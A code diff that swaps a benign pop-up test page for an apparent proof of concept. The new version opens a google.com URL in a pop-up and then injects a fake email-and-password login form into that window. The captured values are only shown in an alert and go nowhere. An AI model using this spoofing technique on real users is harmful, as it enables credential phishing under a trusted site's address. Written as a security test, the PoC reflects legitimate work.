@@ -1,56 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test Pop-up with File Picker</title>
-</head>
-<body>
-
-    <button onclick="openPopup()">Go</button>
-
-    <script>
-        function openPopup() {
-            // Membuka pop-up dengan URL yang valid (misalnya example.com atau URL lain)
-            var x = window.open('https://example.com', 'PopupWindow', 'width=600,height=400');
-
-            if (x) {
-                // Jika pop-up berhasil dibuka, kita menambahkan file picker setelah 3 detik
-                setTimeout(function() {
-                    var content = `
-                        <html>
-                        <head>
-                            <title>Pop-up File Picker</title>
-                        </head>
-                        <body>
-                            <h2>Halo, pilih file untuk diunggah!</h2>
-                            <input type="file" id="filePicker" />
-                            <button onclick="handleFile()">Upload File</button>
-                        </body>
-                        </html>
-                    `;
-                    
-                    // Menulis konten HTML (file picker) ke dalam pop-up
-                    x.document.write(content);
-                    x.document.close();  // Pastikan pop-up dimuat sepenuhnya
-                }, 3000); // Tunggu 3 detik untuk memastikan pop-up dimuat
-            } else {
-                alert("Pop-up diblokir! Pastikan pop-up diizinkan di browser.");
-            }
-        }
-
-        function handleFile() {
-            var input = document.getElementById('filePicker');
-            var file = input.files[0]; // Ambil file yang dipilih
-
-            if (file) {
-                alert("File yang dipilih: " + file.name);
-            } else {
-                alert("Tidak ada file yang dipilih.");
-            }
-        }
-    </script>
-
-</body>
-</html>
+<script>
+function go() {
+    var x = window.open('https://www.google.com/csi');
+    setTimeout(function(){
+        x.document.body.innerHTML = 
+            '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA' +
+            'AAAFCAYAAACNbyblAAAAHElEQVQI12P4/wcAAwAB/9hLS9B4zggwEXhEChcAZgdggp' +
+            'ZmMz3hDi9q8M/y79dyiTj6lwBQ0RVz0Kh0y4gAAAABJRU5ErkJggg==" alt="Hallo Image">' +
+            '<h1>Login</h1>' +
+            'Email:<input id="email"><br>' +
+            'Pass:<input id="pass" type="password"><br>' +
+            // File picker input added
+            'Choose File: <input id="filePicker" type="file"><br>' +
+            '<button onclick="alert(\'Email: \'+document.getElementById(\'email\').value+\'\\nPass:\'+document.getElementById(\'pass\').value)">Login</button>';
+    }, 3000);
+}
+</script>
+<button onclick="go()">Go</button>
 
